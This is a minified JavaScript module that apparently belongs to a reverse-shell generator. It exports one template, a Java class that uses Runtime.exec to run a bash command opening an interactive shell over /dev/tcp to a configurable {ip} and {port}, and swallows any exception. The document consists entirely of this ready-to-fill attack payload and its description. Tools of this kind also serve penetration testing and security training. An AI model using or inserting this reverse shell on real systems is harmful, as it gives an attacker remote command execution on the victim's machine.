const e=[{title:"Java reverse shell #1",template:`public class shell {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/{ip}/{port} 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}`,description:"Java reverse shell using Runtime.exec with bash TCP connection."}],t={commands:e};export{e as commands,t as default};
